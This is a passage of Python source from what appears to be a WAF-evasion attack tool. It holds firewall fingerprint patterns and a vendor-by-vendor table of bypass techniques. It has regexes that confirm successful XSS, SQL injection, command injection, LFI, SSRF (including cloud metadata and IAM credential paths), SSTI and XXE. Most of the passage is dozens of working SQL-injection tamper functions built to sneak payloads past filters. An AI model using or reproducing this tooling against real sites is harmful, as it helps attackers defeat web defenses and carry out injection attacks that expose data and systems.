    },
    "yunaq_chuangyu": {
        "headers": [],
        "body":    [r"365cyd\.(?:com|net)",
                    r"help\.365cyd\.com"],
        "status":  {403},
    },
    "yundun": {
        "headers": [r"server:\s*yundun", r"x-cache:\s*yundun"],
        "body":    [r"blocked by yundun cloud waf",
                    r"yundun\.com/yd_http_error"],
        "status":  {403},
    },
    "yunsuo": {
        "headers": [r"set-cookie:.*yunsuo_session"],
        "body":    [r"yunsuologo"],
        "status":  {403},
    },
    "yxlink": {
        "headers": [r"server:\s*yxlink-waf",
                    r"set-cookie:.*yx_ci_session",
                    r"set-cookie:.*yx_language"],
        "body":    [],
        "status":  {403},
    },
    "zenedge": {
        "headers": [r"server:\s*zenedge", r"x-zen-fury"],
        "body":    [r"/__zenedge/assets/"],
        "status":  {403},
    },
    "zscaler": {
        "headers": [r"server:\s*zscaler"],
        "body":    [r"access denied.*accenture policy",
                    r"policies\.accenture\.com",
                    r"zscloud\.net",
                    r"your organization has selected zscaler"],
        "status":  {403},
    },
}

WAF_VENDOR_BYPASS_HINTS = {
    "cloudflare":  ["charset_ibm037", "tamper:htmlencode", "whitespace", "chunked",
                    "gzip_body"],
    "imperva":     ["tamper:space2comment", "tamper:greatest_bypass", "charset",
                    "junk", "json_body"],
    "modsecurity": ["tamper:modsecurityversioned", "tamper:modsecurityzeroversioned",
                    "tamper:space2comment", "junk", "whitespace"],
    "f5":          ["tamper:charencode", "header", "chunked", "gzip_body"],
    "akamai":      ["junk", "tamper:randomcase", "header", "json_body"],
    "aws_waf":     ["tamper:charencode", "header", "charset", "json_body"],
    "barracuda":   ["whitespace", "tamper:space2comment", "junk"],
    "sucuri":      ["tamper:htmlencode", "charset_ibm037", "whitespace"],
    "fortinet":    ["tamper:charencode", "tamper:space2comment", "chunked"],
}


SUCCESS_PATTERNS = {
    "XSS": [
        r"<script>alert\(1\)</script>",
        r"<script>confirm\(1\)</script>",
        r"onerror=alert\(",
        r"onload=alert\(",
        r"javascript:alert",
        r"<svg[^>]+onload=",
        r"<img[^>]+onerror=",
        r"onerror\s*=",
        r"onload\s*=",
        r"onfocus\s*=",
        r"onclick\s*=",
        r"ontoggle\s*=",
        r"onmouseover\s*=",
        r"onpointerover\s*=",
        r"onstart\s*=",
        r"javascript\s*:",
        r"<svg[^>]+on\w+=",
        r"alert\s*\(",
        r"confirm\s*\(1\)",
        r"\{\{.*constructor",
        r"srcdoc\s*=",
        r"<details[^>]+ontoggle",
    ],
    "SQL Injection": [
        r"you have an error in your sql syntax",
        r"mysql_fetch",
        r"warning:\s*mysql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"syntax error.*sql",
        r"microsoft ole db",
        r"odbc.*error",
        r"ora-\d{5}",
        r"pg::syntaxerror",
        r"sqlite[._]exception",
        r"sql\s+error",
        r"supplied argument is not a valid mysql",
        r"db2 sql error",
        r"invalid query",
    ],
    "Command Injection": [
        r"uid=\d+\(",
        r"root:.*:0:0",
        r"daemon:.+:\d+:\d+",
        r"bin:.+:\d+:\d+",
        r"\[sudo\]",
        r"sh:.*not found",
        r"command not found",
        r"Volume in drive [A-Z]",
        r"Directory of",
        r"Windows IP Configuration",
        r"Linux\s+\S+\s+\d+\.\d+",
    ],
    "LFI": [
        r"root:x:0:0",
        r"root:.*:0:0:",
        r"/bin/bash",
        r"/bin/sh",
        r"daemon:x:",
        r"\[boot loader\]",
        r"\[operating systems\]",
        r"for 16-bit app",
        r"\[extensions\]",
        r"PROCESSOR_IDENTIFIER",
    ],
    "SSRF": [
        r'"ami-id"',
        r'"instance-id"',
        r'"local-ipv4"',
        r"computeMetadata",
        r"iam/security-credentials",
        r"latest/meta-data",
        r"169\.254\.169\.254",
        r"metadata\.google\.internal",
        r"x-aws-ec2",
        r'"computeName"',
        r'"subscriptionId"',
        r'"resourceGroupName"',
        r"oauth2/token.*azure",
        r'"projectId"',
        r'"numericProjectId"',
        r'"serviceAccounts"',
        r'"serviceAccountToken"',
        r"kubernetes\.default\.svc",
        r'"ApiVersion":\s*"v1"',
        r'\[\{"Id":"[a-f0-9]{12}',
        r"\+PONG",
        r"elasticsearch",
        r"cluster_name.*elasticsearch",
        r'"cluster_name"',
        r"root:x:0:0",
        r"\[extensions\]",
        r"Connection refused",
        r"ECONNREFUSED",
        r"No route to host",
    ],

    "SSTI": [
        r"\b49\b",
        r"10489684478481",
        r"uid=\d+\(",
        r"root:.*:0:0",
        r"<Jinja2\s+Environment",
        r"freemarker\.template",
        r"velocity.*template",
        r"org\.thymeleaf",
        r"groovy\.lang",
        r"smarty.*error",
        r"ERB\s+rendering",
        r"ActionView::Template::Error",
        r"jinja2\.exceptions",
        r"\{%.*%\}",
        r"tornado\.template",
        r"mako\.exceptions",
    ],

    "NoSQL Injection": [
        r"MongoError",
        r"mongo.*exception",
        r"mongodb.*error",
        r"SyntaxError.*javascript",
        r"ReferenceError",
        r"TypeError.*filter",
        r"\$where.*failed",
        r"invalid.*operator",
        r"unknown.*operator.*\$",
        r"CastError",
        r"ValidatorError",
        r"11000.*duplicate",
        r"too many documents",
        r"\[object Object\]",
        r"redis.*ERR",
        r"\-ERR.*wrong",
        r"ElasticsearchException",
        r"SearchPhaseExecutionException",
    ],

    "XXE": [
        r"root:x:0:0",
        r"\[extensions\]",
        r"PROCESSOR_IDENTIFIER",
        r"ami-id",
        r"169\.254\.169\.254",
        r"<?xml.*?>",
        r"DOCTYPE.*SYSTEM",
        r"SAXParseException",
        r"XMLSyntaxError",
        r"XML.*parsing.*error",
        r"external.*entity",
        r"ExternalEntityExpansion",
        r"dtd.*not allowed",
        r"javax\.xml",
        r"lxml\.etree",
        r"libxml2",
        r"ENTITY.*declared",
    ],
}


_IBM037 = {
    ' ':0x40,'!':0x5A,'"':0x7F,'#':0x7B,'$':0x5B,'%':0x6C,"'":0x7D,
    '(':0x4D,')':0x5D,'*':0x5C,'+':0x4E,',':0x6B,'-':0x60,'.':0x4B,
    '/':0x61,'0':0xF0,'1':0xF1,'2':0xF2,'3':0xF3,'4':0xF4,'5':0xF5,
    '6':0xF6,'7':0xF7,'8':0xF8,'9':0xF9,':':0x7A,';':0x5E,'<':0x4C,
    '>':0x6E,'?':0x6F,'@':0x7C,'A':0xC1,'B':0xC2,'C':0xC3,'D':0xC4,
    'E':0xC5,'F':0xC6,'G':0xC7,'H':0xC8,'I':0xC9,'J':0xD1,'K':0xD2,
    'L':0xD3,'M':0xD4,'N':0xD5,'O':0xD6,'P':0xD7,'Q':0xD8,'R':0xD9,
    'S':0xE2,'T':0xE3,'U':0xE4,'V':0xE5,'W':0xE6,'X':0xE7,'Y':0xE8,
    'Z':0xE9,'[':0xAD,'\\':0xE0,']':0xBD,'^':0x5F,'_':0x6D,'`':0x79,
    'a':0x81,'b':0x82,'c':0x83,'d':0x84,'e':0x85,'f':0x86,'g':0x87,
    'h':0x88,'i':0x89,'j':0x91,'k':0x92,'l':0x93,'m':0x94,'n':0x95,
    'o':0x96,'p':0x97,'q':0x98,'r':0x99,'s':0xA2,'t':0xA3,'u':0xA4,
    'v':0xA5,'w':0xA6,'x':0xA7,'y':0xA8,'z':0xA9,
}

def ibm037_encode(text):
    out = []
    for ch in text:
        if ch in ('=', '&'):
            out.append(ch)
        elif ch in _IBM037:
            out.append('%%%02X' % _IBM037[ch])
        else:
            try:
                out.append('%%%02X' % ord(ch))
            except Exception:
                out.append(ch)
    return ''.join(out)


def _gzip_compress(data_bytes):
    data = bytes(data_bytes)
    compressed = _zlib.compress(data, 9)
    crc  = _zlib.crc32(data) & 0xFFFFFFFF
    size = len(data) & 0xFFFFFFFF
    raw_deflate = compressed[2:-4]
    gzip_header = bytearray([
        0x1f, 0x8b,
        0x08,
        0x00,
        0x00, 0x00, 0x00, 0x00,
        0x02,
        0xFF,
    ])
    gzip_footer = bytearray(_struct.pack('<II', crc, size))
    return gzip_header + bytearray(raw_deflate) + gzip_footer


def _json_unicode_escape(payload):
    try:
        if not isinstance(payload, unicode):
            payload = payload.decode('utf-8', errors='replace')
        return u''.join(u'\\u%04x' % ord(c) for c in payload)
    except Exception:
        return u''.join(u'\\u%04x' % ord(c) for c in str(payload))


def _chunked_encode(body_bytes, chunk_size=1):
    out = bytearray()
    crlf = bytearray([13, 10])
    data = bytes(body_bytes)
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        size_str = '%X' % len(chunk)
        out += bytearray(size_str.encode('ascii')) + crlf
        out += bytearray(chunk) + crlf
    out += bytearray(b'0') + crlf + crlf
    return out


def _is_post_request(raw_req):
    try:
        first_line = bytes(raw_req).split(b'\r\n')[0]
        return first_line.upper().startswith(b'POST')
    except Exception:
        return False



import random as _random

_SQL_KEYWORDS = set([
    'SELECT','FROM','WHERE','AND','OR','UNION','ALL','ORDER','BY','GROUP',
    'HAVING','LIMIT','OFFSET','INSERT','INTO','VALUES','UPDATE','SET',
    'DELETE','DROP','CREATE','TABLE','DATABASE','SCHEMA','INDEX','VIEW',
    'IF','ELSE','CASE','WHEN','THEN','END','NOT','IN','LIKE','BETWEEN',
    'IS','NULL','TRUE','FALSE','AS','ON','JOIN','INNER','LEFT','RIGHT',
    'OUTER','CROSS','NATURAL','USING','EXISTS','DISTINCT','TOP','ROWNUM',
    'SLEEP','BENCHMARK','WAITFOR','DELAY','PG_SLEEP','DBMS_PIPE',
    'EXTRACTVALUE','UPDATEXML','EXP','CHAR','ASCII','HEX','UNHEX',
    'CONCAT','CONCAT_WS','GROUP_CONCAT','SUBSTR','SUBSTRING','MID',
    'LENGTH','UPPER','LOWER','TRIM','REPLACE','REVERSE','REPEAT',
    'LOAD_FILE','OUTFILE','DUMPFILE','INFORMATION_SCHEMA','COLUMNS',
    'TABLES','SCHEMATA','USER','VERSION','DATABASE','CURRENT_USER',
    'SESSION_USER','SYSTEM_USER','FLOOR','RAND','CONVERT','CAST',
    'COALESCE','IFNULL','ISNULL','GREATEST','LEAST','ELT','FIELD',
    'MAKE_SET','EXPORT_SET','GET_LOCK','RELEASE_LOCK','GTID_SUBSET',
    'JSON_KEYS','XMLTYPE','UTL_HTTP','DBMS_XPLAN',
    'EXEC','EXECUTE','SP_EXECUTESQL','XP_CMDSHELL','SP_PASSWORD',
    'OPENROWSET','OPENDATASOURCE','BULK','PIVOT','UNPIVOT',
    'BEGIN','DECLARE','PRINT','RAISERROR','ROLLBACK','COMMIT',
    'TRANSACTION','TRIGGER','PROCEDURE','FUNCTION','RETURN',
])


def _is_in_quotes(s, pos):
    in_single, in_double = False, False
    i = 0
    while i < pos:
        c = s[i]
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_single:
            in_double = not in_double
        elif c == '\\' and i + 1 < len(s):
            i += 1
        i += 1
    return in_single or in_double


def tamper_space2comment(sql):
    out, i = [], 0
    while i < len(sql):
        c = sql[i]
        if c == ' ' and not _is_in_quotes(sql, i):
            out.append('/**/')
        else:
            out.append(c)
        i += 1
    return ''.join(out)


def tamper_space2plus(sql):
    return sql.replace(' ', '+')


def tamper_space2dash(sql):
    return sql.replace(' ', '--\nN')


def tamper_space2hash(sql):
    return sql.replace(' ', '#\n')


def tamper_space2mssqlblank(sql):
    blanks = ['%01','%02','%03','%04','%05','%06','%07',
              '%08','%09','%0B','%0C','%0D','%0E','%0F',
              '%10','%11','%12','%13','%14','%15','%16',
              '%17','%18','%19','%1A','%1B','%1C','%1D',
              '%1E','%1F','%20']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2mysqlblank(sql):
    blanks = ['%09', '%0A', '%0B', '%0C', '%0D']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2randomblank(sql):
    blanks = ['%09','%0A','%0C','%0D','%20','%A0','/**/','+']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2morecomment(sql):
    return sql.replace(' ', '/**_**/')


def tamper_randomcase(sql):
    def _rc(word):
        result = ''
        for c in word:
            result += c.upper() if _random.randint(0,1) else c.lower()
        if result == result.upper() or result == result.lower():
            mid = len(result) // 2
            result = result[:mid] + result[mid].swapcase() + result[mid+1:]
        return result

    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return _rc(w)
        return w

    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_uppercase(sql):
    def _replace(m):
        w = m.group(0)
        return w.upper() if w.upper() in _SQL_KEYWORDS else w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_lowercase(sql):
    def _replace(m):
        w = m.group(0)
        return w.lower() if w.upper() in _SQL_KEYWORDS else w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_charencode(sql):
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        else:
            out.append('%%%02X' % ord(sql[i]))
            i += 1
    return ''.join(out)


def tamper_chardoubleencode(sql):
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append('%25' + sql[i+1:i+3])
            i += 3
        else:
            pct = '%%%02X' % ord(sql[i])
            out.append('%25' + pct[1:])
            i += 1
    return ''.join(out)


def tamper_charunicodeencode(sql):
    out = []
    for c in sql:
        if c.isalnum():
            out.append('%%u%04X' % ord(c))
        else:
            out.append(c)
    return ''.join(out)


def tamper_charunicodeescape(sql):
    out = []
    for c in sql:
        if c.isalnum():
            out.append('\\u%04X' % ord(c))
        else:
            out.append(c)
    return ''.join(out)


def tamper_percentage(sql):
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        elif sql[i] == ' ':
            out.append(' ')
            i += 1
        else:
            out.append('%' + sql[i])
            i += 1
    return ''.join(out)


def tamper_overlongutf8(sql):
    out, i = [], 0
    while i < len(sql):
        c = sql[i]
        if sql[i] == '%' and i+2 < len(sql) and all(
                x in '0123456789abcdefABCDEF' for x in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        elif c.isalnum():
            out.append(c)
            i += 1
        else:
            b = ord(c)
            byte1 = 0xC0 + (b >> 6)
            byte2 = 0x80 + (b & 0x3F)
            out.append('%%%02X%%%02X' % (byte1, byte2))
            i += 1
    return ''.join(out)


def tamper_htmlencode(sql):
    out = []
    for c in sql:
        if c.isalnum() or c == ' ':
            out.append(c)
        else:
            out.append('&#%d;' % ord(c))
    return ''.join(out)


def tamper_decentities(sql):
    return ''.join('&#%d;' % ord(c) for c in sql)


def tamper_hexentities(sql):
    return ''.join('&#x%X;' % ord(c) for c in sql)


def tamper_between(sql):
    sql = re.sub(r'=\s*(\w+)', r'BETWEEN \1 AND \1', sql)
    sql = re.sub(r'>\s*(\w+)', r'NOT BETWEEN 0 AND \1', sql)
    return sql


def tamper_equaltolike(sql):
    return re.sub(r'(?<![<>!])=', ' LIKE ', sql)


def tamper_equaltorlike(sql):
    return re.sub(r'(?<![<>!])=', ' RLIKE ', sql)


def tamper_greatest(sql):
    def _repl(m):
        lhs = m.group(1).strip()
        rhs = m.group(2).strip()
        return m.group(0).split(lhs)[0] + lhs + ' GREATEST(' + lhs + ',' + rhs + '+1)=' + lhs
    return re.sub(r'([\w().]+)\s*>\s*([\w().]+)', _repl, sql)


def tamper_least(sql):
    def _repl(m):
        lhs = m.group(1).strip()
        rhs = m.group(2).strip()
        return lhs + ' LEAST(' + lhs + ',' + rhs + '+1)=' + lhs
    return re.sub(r'([\w().]+)\s*<\s*([\w().]+)', _repl, sql)


def tamper_modsecurityversioned(sql):
    idx = sql.find(' ')
    if idx < 0:
        return '/*!30000%s*/' % sql
    digit = str(_random.randint(0, 9))
    postfix = ''
    for suffix in ('--', '#', '/*'):
        if sql.rstrip().endswith(suffix):
            postfix = suffix
            sql = sql.rstrip()[:-len(suffix)].rstrip()
            break
    return '%s /*!3%s000%s*/%s' % (sql[:idx], digit, sql[idx+1:], postfix)


def tamper_modsecurityzeroversioned(sql):
    idx = sql.find(' ')
    if idx < 0:
        return '/*!00000%s*/' % sql
    postfix = ''
    for suffix in ('--', '#', '/*'):
        if sql.rstrip().endswith(suffix):
            postfix = suffix
            sql = sql.rstrip()[:-len(suffix)].rstrip()
            break
    return '%s /*!00000%s*/%s' % (sql[:idx], sql[idx+1:], postfix)


def tamper_versionedmorekeywords(sql):
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '/*!%s*/' % w
        return w
    result = re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)
    result = result.replace(' /*!', '/*!').replace('*/ ', '*/')
    return result


def tamper_halfversionedmorekeywords(sql):
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '/*!0%s' % w
        return w
    result = re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)
    return result.replace(' /*!0', '/*!0')


def tamper_multiplespaces(sql):
    return sql.replace(' ', '    ')


def tamper_commentbeforeparentheses(sql):
    return sql.replace('(', '/**/(')


def tamper_randomcomments(sql):
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS and len(w) > 2:
            mid = _random.randint(1, len(w)-1)
            return w[:mid] + '/**/' + w[mid:]
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_apostrophemask(sql):
    return sql.replace("'", '%EF%BC%87')


def tamper_apostrophenullencode(sql):
    return sql.replace("'", '%00%27')


def tamper_unmagicquotes(sql):
    return sql.replace("'", '%bf%27%00')


def tamper_appendnullbyte(sql):
    return sql + '%00'


def tamper_bluecoat(sql):
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return w + '%09'
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b(?= )', _replace, sql)


def tamper_sp_password(sql):
    return sql.rstrip() + ' sp_password'


def tamper_sleep2getlock(sql):
    return re.sub(
        r'SLEEP\((\d+)\)',
        lambda m: "GET_LOCK('WafBreaker',%s)" % m.group(1),
        sql, flags=re.IGNORECASE)


def tamper_substring2mid(sql):
    return re.sub(r'\bSUBSTRING\b', 'MID', sql, flags=re.IGNORECASE)


def tamper_concat2concatws(sql):
    def _repl(m):
        inner = m.group(1)
        return "CONCAT_WS(MID(CHAR(0),0,0),%s)" % inner
    return re.sub(r'\bCONCAT\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_ord2ascii(sql):
    return re.sub(r'\bORD\(', 'ASCII(', sql, flags=re.IGNORECASE)


def tamper_informationschemacomment(sql):
    return re.sub(
        r'\binformation_schema\b',
        'information_schema/**/',
        sql, flags=re.IGNORECASE)


def tamper_schemasplit(sql):
    return re.sub(r'(\w+)\.(\w+)', r'\1/**/./**/\2', sql)


def tamper_symboliclogical(sql):
    sql = re.sub(r'\bAND\b', '&&', sql, flags=re.IGNORECASE)
    sql = re.sub(r'\bOR\b',  '||', sql, flags=re.IGNORECASE)
    return sql


def tamper_misunion(sql):
    return re.sub(r'\bUNION\s+SELECT\b', 'UNION(SELECT', sql, flags=re.IGNORECASE)


def tamper_0eunion(sql):
    return re.sub(r'\bUNION\b', '0E0UNION', sql, flags=re.IGNORECASE)


def tamper_dunion(sql):
    return re.sub(r'\bUNION\b', '.UNION', sql, flags=re.IGNORECASE)


def tamper_scientific(sql):
    return re.sub(r'\b(\d+)\b', r'\1e0', sql)


def tamper_binary(sql):
    return re.sub(r"='([^']*)'", r"=BINARY'\1'", sql)



def tamper_versiongatedcomment(sql):
    keywords = ['SELECT', 'UNION', 'AND', 'OR', 'WHERE', 'FROM',
                'ORDER', 'GROUP', 'HAVING', 'LIMIT', 'INSERT', 'UPDATE']
    out = sql
    for kw in keywords:
        out = re.sub(r'(?i)\b' + kw + r'\b',
                     '/*!50000' + kw + '*/', out)
    return out


def tamper_dollarquoting(sql):
    return re.sub(r"'([^']*)'", r'$$\1$$', sql)


try:
    _unichr = unichr
except NameError:
    _unichr = chr

_FULLWIDTH_MAP = {}
for _i in range(0x41, 0x5B):
    _FULLWIDTH_MAP[chr(_i)] = _unichr(_i - 0x41 + 0xFF21)
for _i in range(0x61, 0x7B):
    _FULLWIDTH_MAP[chr(_i)] = _unichr(_i - 0x61 + 0xFF41)


def tamper_fullwidthunicode(sql):
    try:
        if not isinstance(sql, unicode):
            sql = sql.decode('utf-8', errors='replace')
        return u''.join(_FULLWIDTH_MAP.get(c, c) for c in sql)
    except NameError:
        return ''.join(_FULLWIDTH_MAP.get(c, c) for c in sql)


def tamper_nprefixquote(sql):
    return re.sub(r"(?<![N])(')", r"N\1", sql)


def tamper_execconcat(sql):
    if re.search(r'\bSELECT\b', sql, re.IGNORECASE):
        obf = re.sub(r'\bSELECT\b',
                     "'SE'+'LECT'", sql, flags=re.IGNORECASE)
        return "EXEC(" + obf + ")"
    return sql


def tamper_json_inline(sql):
    sql = re.sub(r'\b1\s*=\s*1\b',
                 "JSON_LENGTH('{}')<=8896", sql, flags=re.IGNORECASE)
    sql = re.sub(r'\b1\s*=\s*0\b',
                 "JSON_LENGTH('{}')<0", sql, flags=re.IGNORECASE)
    sql = re.sub(r'\b0\s*=\s*1\b',
                 "JSON_LENGTH('{}')<0", sql, flags=re.IGNORECASE)
    sql = re.sub(r'\bUNION\s+SELECT\b',
                 'UNION distinctrow SELECT', sql, flags=re.IGNORECASE)
    return sql


def tamper_if2case(sql):
    def _repl(m):
        args = m.group(1).split(',', 2)
        if len(args) == 3:
            return 'CASE WHEN (%s) THEN (%s) ELSE (%s) END' % tuple(args)
        return m.group(0)
    return re.sub(r'\bIF\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_ifnull2casewhenisnull(sql):
    def _repl(m):
        args = m.group(1).split(',', 1)
        if len(args) == 2:
            a, b = args
            return 'CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END' % (a, b, a)
        return m.group(0)
    return re.sub(r'\bIFNULL\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_unionalltounion(sql):
    return re.sub(r'\bUNION\s+ALL\s+SELECT\b', 'UNION SELECT', sql, flags=re.IGNORECASE)


def tamper_plus2concat(sql):
    return re.sub(r"'([^']*)'\+", r"CONCAT('\1',", sql)


def tamper_commalesslimit(sql):
    return re.sub(
        r'\bLIMIT\s+(\d+)\s*,\s*(\d+)',
        r'LIMIT \2 OFFSET \1',
        sql, flags=re.IGNORECASE)


def tamper_commalessmid(sql):
    def _repl(m):
        args = m.group(1).split(',', 2)
        if len(args) == 3:
            return 'MID(%s FROM %s FOR %s)' % tuple(a.strip() for a in args)
        return m.group(0)
    return re.sub(r'\bMID\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_escapequotes(sql):
    return sql.replace("'", "\\'").replace('"', '\\"')


def tamper_hex2char(sql):
    def _repl(m):
        val = int(m.group(1), 16)
        return 'CHAR(%d)' % val
    return re.sub(r'0x([0-9a-fA-F]{2})', _repl, sql)


def tamper_luanginx(sql):
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '\n' + w
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)



SQLI_TAMPERS = [
    ("space2comment",          tamper_space2comment,          "Spaces -> /**/",                       "any"),
    ("space2plus",             tamper_space2plus,             "Spaces -> +",                          "any"),
    ("space2dash",             tamper_space2dash,             "Spaces -> --\\nN",                     "mysql"),
    ("space2hash",             tamper_space2hash,             "Spaces -> #\\n",                       "mysql"),
    ("space2mssqlblank",       tamper_space2mssqlblank,       "Spaces -> random %0X (MSSQL)",         "mssql"),
    ("space2mysqlblank",       tamper_space2mysqlblank,       "Spaces -> random %0X (MySQL)",         "mysql"),
    ("space2randomblank",      tamper_space2randomblank,      "Spaces -> random blank variant",       "any"),
    ("space2morecomment",      tamper_space2morecomment,      "Spaces -> /**_**/",                    "any"),
    ("charencode",             tamper_charencode,             "URL-encode each char",                "any"),
    ("chardoubleencode",       tamper_chardoubleencode,       "Double URL-encode",                   "any"),
    ("charunicodeencode",      tamper_charunicodeencode,      "Unicode %uXXXX alphanums",            "any"),
    ("charunicodeescape",      tamper_charunicodeescape,      "\\uXXXX escape alphanums",            "any"),
    ("percentage",             tamper_percentage,             "%S%E%L%E%C%T -- ASP/IIS bypass",       "mssql"),
    ("overlongutf8",           tamper_overlongutf8,           "Overlong UTF-8 non-alphanums",        "any"),
    ("htmlencode",             tamper_htmlencode,             "HTML entity non-alphanums",           "any"),
    ("decentities",            tamper_decentities,            "&#N; all characters",                 "any"),
    ("hexentities",            tamper_hexentities,            "&#xN; hex all characters",            "any"),
    ("randomcase",             tamper_randomcase,             "sElEcT random casing",                "any"),
    ("uppercase",              tamper_uppercase,              "UPPERCASE keywords",                  "any"),
    ("lowercase",              tamper_lowercase,              "lowercase keywords",                  "any"),
    ("randomcomments",         tamper_randomcomments,         "SE/**/LECT mid-keyword comments",     "any"),
    ("multiplespaces",         tamper_multiplespaces,         "Multiple spaces between tokens",      "any"),
    ("commentbeforeparentheses",tamper_commentbeforeparentheses,"/**/ before ( -- SLEEP/**/(5)",     "any"),
    ("bluecoat",               tamper_bluecoat,               "Keyword%09 -- Bluecoat proxy",         "any"),
    ("luanginx",               tamper_luanginx,               "Newline before keywords (Lua-nginx)", "any"),
    ("modsecurityversioned",    tamper_modsecurityversioned,    "/*!3XREMAINDER*/",                  "mysql"),
    ("modsecurityzeroversioned",tamper_modsecurityzeroversioned,"/*!00000REMAINDER*/",              "mysql"),
    ("versionedmorekeywords",   tamper_versionedmorekeywords,   "/*!KEYWORD*/ wrapping",             "mysql"),
    ("halfversionedmorekeywords",tamper_halfversionedmorekeywords,"/*!0KEYWORD prefixing",          "mysql"),
    ("between",                tamper_between,                "= -> BETWEEN, > -> NOT BETWEEN",        "any"),
    ("equaltolike",            tamper_equaltolike,            "= -> LIKE",                            "any"),
    ("equaltorlike",           tamper_equaltorlike,           "= -> RLIKE (MySQL)",                   "mysql"),
    ("greatest",               tamper_greatest,               "> -> GREATEST(A,B+1)=A",               "any"),
    ("least",                  tamper_least,                  "< -> LEAST(A,B+1)=A",                  "any"),
    ("symboliclogical",        tamper_symboliclogical,        "AND->&& OR->||",                        "any"),
    ("apostrophemask",         tamper_apostrophemask,         "' -> %EF%BC%87 (fullwidth)",           "any"),
    ("apostrophenullencode",   tamper_apostrophenullencode,   "' -> %00%27",                          "any"),
    ("unmagicquotes",          tamper_unmagicquotes,          "' -> %BF%27 GBK multibyte",            "mysql"),
    ("escapequotes",           tamper_escapequotes,           "\\\\'  backslash-escape quotes",      "any"),
    ("appendnullbyte",         tamper_appendnullbyte,         "Append %00 null byte",                "any"),
    ("sp_password",            tamper_sp_password,            "Append sp_password (MSSQL log)",      "mssql"),
    ("sleep2getlock",          tamper_sleep2getlock,          "SLEEP -> GET_LOCK (MySQL)",             "mysql"),
    ("substring2mid",          tamper_substring2mid,          "SUBSTRING -> MID",                     "mysql"),
    ("concat2concatws",        tamper_concat2concatws,        "CONCAT -> CONCAT_WS",                  "mysql"),
    ("ord2ascii",              tamper_ord2ascii,              "ORD -> ASCII",                         "mysql"),
    ("informationschemacomment",tamper_informationschemacomment,"information_schema/**/ comment",   "mysql"),
    ("schemasplit",            tamper_schemasplit,            "db/**/./**/table schema split",       "any"),
    ("binary",                 tamper_binary,                 "BINARY prefix collation bypass",      "mysql"),
    ("if2case",                tamper_if2case,                "IF->CASE WHEN",                        "any"),
    ("ifnull2casewhenisnull",  tamper_ifnull2casewhenisnull,  "IFNULL->CASE WHEN ISNULL",             "any"),
    ("commalesslimit",         tamper_commalesslimit,         "LIMIT M,N -> LIMIT N OFFSET M",        "any"),
    ("commalessmid",           tamper_commalessmid,           "MID(A,B,C) -> MID(A FROM B FOR C)",    "any"),
    ("hex2char",               tamper_hex2char,               "0xHH -> CHAR(N)",                      "any"),
    ("0eunion",                tamper_0eunion,                "UNION -> 0E0UNION",                    "any"),
    ("dunion",                 tamper_dunion,                 "UNION -> .UNION",                      "mysql"),
    ("misunion",               tamper_misunion,               "UNION SELECT -> UNION(SELECT",         "mysql"),
    ("unionalltounion",        tamper_unionalltounion,        "UNION ALL SELECT -> UNION SELECT",     "any"),
    ("scientific",             tamper_scientific,             "1 -> 1e0 numeric literals",            "mysql"),
    ("versiongatedcomment",    tamper_versiongatedcomment,    "SELECT -> /*!50000SELECT*/",            "mysql"),
    ("dollarquoting",          tamper_dollarquoting,          "'str' -> $$str$$",                     "pgsql"),
    ("fullwidthunicode",       tamper_fullwidthunicode,       "SELECT -> SELECT fullwidth",    "any"),
    ("nprefixquote",           tamper_nprefixquote,           "' -> N' Unicode prefix",               "mssql,mysql"),
    ("execconcat",             tamper_execconcat,             "SELECT -> EXEC('SE'+'LECT')",           "mssql"),
    ("jsoninline",             tamper_json_inline,            "1=1 -> JSON_LENGTH('{}')<=8896 + distinctrow", "mysql,pgsql,mssql,sqlite"),
]



MAX_MUTATIONS_PER_PAYLOAD = 25

_SQLI_TRUE_EQUIV = [
    ("10>5",                    "numeric_gt"),
    ("2+3=5",                   "arithmetic_sum"),
    ("100>50",                  "large_numeric_gt"),
    ("6-1=5",                   "arithmetic_sub"),
    ("4/2=2",                   "arithmetic_div"),
    ("3*3=9",                   "arithmetic_mul"),
    ("1<=1",                    "lte_operator"),
    ("1>=1",                    "gte_operator"),
    ("1!=2",                    "neq_bang"),
    ("1<>2",                    "neq_arrow"),
    ("1 BETWEEN 0 AND 2",       "between_op"),
